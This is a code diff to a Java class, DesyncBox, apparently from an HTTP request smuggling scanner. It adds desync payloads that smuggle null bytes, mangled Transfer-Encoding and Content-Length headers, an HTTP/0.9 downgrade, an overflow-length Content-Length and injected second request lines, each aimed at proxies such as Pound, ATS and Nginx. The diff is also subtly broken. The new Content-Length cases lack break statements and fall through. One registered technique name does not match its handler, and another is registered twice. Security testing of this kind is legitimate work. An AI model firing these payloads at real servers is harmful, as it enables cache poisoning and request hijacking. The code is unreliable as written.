@@ -53,6 +53,12 @@ public class DesyncBox {
         sharedPermutations.register("options", true);
         sharedPermutations.register("head", true);
         sharedPermutations.register("range", true);
+        sharedPermutations.register("regilero-chunkedzorg", true);
+        sharedPermutations.register("regilero-nullbyteTE", true);
+        sharedPermutations.register("regilero-nullbyteTE", true);
+        sharedPermutations.register("regilero-spaceTE", true);
+        sharedPermutations.register("regilero-choppedTE", true);
+        sharedPermutations.register("regilero-regilero-zTE", true);
 
         for(int i: DesyncBox.getSpecialChars()) {
             sharedPermutations.register("spacefix1:"+i, true);
@@ -83,6 +89,7 @@ public class DesyncBox {
         h1Permutations.register("badwrap", true);
         h1Permutations.register("bodysplit", true);
         h1Permutations.register("h1case", true);
+        h1Permutations.register("http0.9",true);
         h1Permutations.register("http1.0", true);
 
         h2Permutations.register("http2hide", true);
@@ -108,6 +115,13 @@ public class DesyncBox {
         clPermutations.register("CL-expect", true);
         clPermutations.register("CL-error", true);
         clPermutations.register("CL-spacepad", true);
+        clPermutations.register("CL-nullbytevariation", true);
+        clPermutations.register("CL-nullbytevariation2", true);
+        clPermutations.register("CL-nullbytevariation3", true);
+        clPermutations.register("CL-nullbytevariation4", true);
+        clPermutations.register("CL-nginxintoverflow", true);
+        clPermutations.register("CL-nullbyte", true);
+        clPermutations.register("CL-nullbytedoubleCL", true);
 
         supportedPermutations = new HashSet<>();
         supportedPermutations.addAll(sharedPermutations.getSettings());
@@ -196,6 +210,10 @@ public class DesyncBox {
                 // Technique from "HTTP Request Smuggling in 2020"  by Amit Klein
                 permuted = header.replace("-", "\\");
                 break;
+            //cocoh_23 test
+            case "forwardslash":
+                permuted = header.replace("-", "/");
+                break;
         }
         
 
@@ -249,6 +267,10 @@ public class DesyncBox {
 
         if (technique.equals("http1.0")) {
             transformed = Utilities.replaceFirst(transformed, "HTTP/1.1", "HTTP/1.0");
+        }
+
+        if (technique.equals("http0.9")) {//Regilero (HTTPWookie payload to achieve CP)
+            transformed = Utilities.replaceFirst(transformed, "HTTP/1.1", "HTTP/0.9");
         }
 
         switch (technique) {
@@ -320,7 +342,17 @@ public class DesyncBox {
                 transformed = Utilities.replace(transformed, "barzxaazz", "barn\n\nTransfer-Encoding: chunked");
             } else if (technique.equals("nested")) {
                 transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity, chunked, identity");
-            } else if (technique.equals("http2hide")) {
+            }else if(technique.equals("regilero-chunkedzorg")){ //Regilero Technique
+                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked, zorg");
+            }else if(technique.equals("regilero-nullbyteTE")){ //Regilero Technique
+                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-\0Mode: magic\r\nEncoding: chunked");
+            }else if (technique.equals("regilero-choppedTE")){ //Regilero Technique (HTTPWookie payload)
+                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-: 42\r\nEncoding: chunked");
+            }else if (technique.equals("regilero-spaceTE")){ //Regilero Technique (HTTPWookie payload)
+                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", " Transfer-Encoding: chunked");
+            }else if (technique.equals("regilero-zTE")){ //Regilero Technique (HTTPWookie payload)
+                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "ZTransfer-Encoding: chunked");
+            }else if (technique.equals("http2hide")) {
                 transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Foo: b^~Transfer-Encoding: chunked^~x: x");
             } else if (technique.equals("encode")) {
                 transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked");
@@ -396,7 +428,21 @@ public class DesyncBox {
                     break;
                 case "CL-error":
                     transformed =  Utilities.replace(request, "Content-Length: " + value, "X-Invalid Y: \r\nContent-Length: " + value);
-            }
+                case "CL-nullbyte"://Regilero Technique (PoundLB)
+                    transformed =  Utilities.replace(request, "Content-Length: " + value, "Content-\0Dummy: Foo\r\nLength: " + value);
+                case "CL-nullbytevariation"://Regilero Technique (PoundLB)
+                    transformed =  Utilities.replace(request, "Content-Length: " + value, "Content-Length: " + value + "\0");
+                case "CL-nullbytedoubleCL"://Regilero Technique (PoundLB)
+                    transformed =  Utilities.replace(request, "Content-Length: " + value, "Content-\0Dummy: Foo\r\nLength: " + value + "\r\nContent-Length: 0");
+                case "CL-nullbytevariation2"://Regilero Technique (ATS)
+                    transformed =  Utilities.replace(request, "Content-Length: " + value, "Content-Length: " + value + "\r\nX-Something: \0 something");
+                case "CL-nullbytevariation3"://Regilero Technique (ATS)
+                    transformed =  Utilities.replace(request, "Content-Length: " + value, "X-Something: \0 something\r\nGET http://google.com/index.html HTTP/1.1");
+                case "CL-nullbytevariation4"://Regilero Technique (ATS)
+                    transformed =  Utilities.replace(request, "Content-Length: " + value, "X-Something: \"\0something\"\r\nGET http://google.com/index.html HTTP/1.1");
+                case "CL-nginxintoverflow"://Regilero Technique (Nginx 1.7.11 integer overflow idea)
+                    transformed =  Utilities.replace(request, "Content-Length: " + value, "Content-Length: 90000000000000000000000000000000000000000000000000000000000000015");
+                }
         }
         
         if (Arrays.equals(transformed, request) && !technique.equals("vanilla")) {
